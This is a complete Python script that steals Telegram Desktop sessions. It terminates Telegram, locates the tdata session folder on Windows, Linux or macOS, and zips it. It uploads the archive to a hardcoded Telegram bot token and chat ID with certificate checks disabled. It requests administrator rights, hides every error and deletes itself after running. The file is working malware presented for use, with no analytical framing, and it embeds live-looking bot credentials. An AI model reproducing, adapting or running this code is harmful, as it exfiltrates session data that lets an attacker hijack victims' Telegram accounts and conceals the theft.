import os, sys, zipfile, requests, tempfile, ctypes

TOKEN = "8163157021:AAGE1b81bD7n7NB4UMCXhIjYqnlM2ZGyFMo"
CHAT_ID = "7984884145"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def kill_telegram():
    os.system("taskkill /f /im Telegram.exe >nul 2>&1" if os.name == 'nt' else "pkill -f Telegram >/dev/null 2>&1")

def get_tdata():
    paths = [
        os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'),
        os.path.expanduser('~/.local/share/TelegramDesktop/tdata'),
        os.path.expanduser('~/Library/Application Support/Telegram/tdata')
    ]
    return next((p for p in paths if os.path.exists(p)), None)

def main():
    try:
        kill_telegram()
        if not (tdata := get_tdata()): return
        
        with zipfile.ZipFile((zf := tempfile.mktemp(suffix='.zip')), 'w') as z:
            for root, _, files in os.walk(tdata):
                for f in files:
                    try: z.write(os.path.join(root, f), os.path.relpath(os.path.join(root, f), tdata))
                    except: continue
        
        with open(zf, 'rb') as f:
            requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument', 
                        files={'document': f}, 
                        data={'chat_id': CHAT_ID}, 
                        verify=False)
        
    except: pass
    finally:
        if os.path.exists(zf): os.remove(zf)
        if os.path.exists(__file__): os.remove(__file__)

if __name__ == '__main__':
    if os.name == 'nt' and not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    else:
        main()
